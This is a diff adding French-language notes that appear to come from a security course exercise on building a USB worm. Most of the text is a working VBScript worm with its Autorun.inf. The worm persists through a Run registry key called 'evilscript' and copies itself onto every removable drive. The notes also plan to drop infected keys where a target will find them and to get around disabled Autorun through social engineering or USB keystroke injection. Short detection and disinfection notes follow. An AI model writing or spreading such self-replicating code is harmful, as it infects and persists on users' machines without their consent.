@@ -1,0 +1,51 @@
+3) La clé lance automatiquement notre script vbs
+4) Diffusion initiale : Clés infectées distribuées / déposées à un endroit où la cible initiale risquera de la trouver
+   Primo infection : le script exécuté par autorun se réplique sur tout les lecteurs USB / réseaux (?) avec l'autorun et le script lui même
+Autorun.inf :
+[AutoRun]
+open=script.vbs
+shell\open\Command=script.vbs
+shell\explore\Command=script.vbs
+
+Script complet script.vbs:
+Wscript.echo "Hello World"
+Set WshShell = WScript.CreateObject("WScript.Shell")
+Dim oFSO
+Set oFSO = CreateObject("Scripting.FileSystemObject")
+oFSO.CopyFile WScript.ScriptFullName,WshShell.SpecialFolders("MyDocuments")&"\script.vbs",True
+
+WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evilscript", WshShell.SpecialFolders("MyDocuments")&"\script.vbs"
+
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\root\cimv2")
+Set colDisks = objWMIService.ExecQuery ("Select * from Win32_LogicalDisk")
+nb = 0
+For Each objDisk in colDisks
+If objDisk.DriveType = 2 Then
+oFSO.CopyFile WScript.ScriptFullName,objDisk.DeviceID & "\script.vbs",True
+Const ForWriting = 2
+Dim fic
+Set fic = oFSO.OpenTextFile(objDisk.DeviceID & "\Autorun.inf", ForWriting, true)
+fic.writeLine("[AutoRun]")
+fic.writeLine("open=script.vbs")
+fic.writeLine("shell\open\Command=script.vbs")
+fic.writeLine("shell\explore\Command=script.vbs")
+fic.Close
+nb = nb + 1
+End If
+Next
+If nb = 0 Then
+Wscript.Echo "Aucun périphérique amovible détecté"
+End If
+
+9) Détection du ver : recherche dans la base de registres, dans My Documents, sur les périphériques amovibles
+	Détection par signature (code non polymorphique), Appels systèmes douteux
+
+   Procédure de désinfection : suppression de : la clé dans la base de registres
+						du fichier dans Mes Documents
+						de l'autorun et du script sur les périphériques amovibles insérés
+
+Microsoft a choisi de désactiver l'Autorun, qui est le coeur du problème ici (exécution sans action de l'utilisateur)
+Il est possible d'amener l'utilisateur à exécuter le script par Social Engineering, ce n'est donc pas complètement satisfaisant
+
+L'attaque contourne le problème en ajoutant la possibilité d'injecter des appui sur des touches en simulant un clavier USB
+il est donc possible d'exécuter malgré tout le ver, sans autorun. 
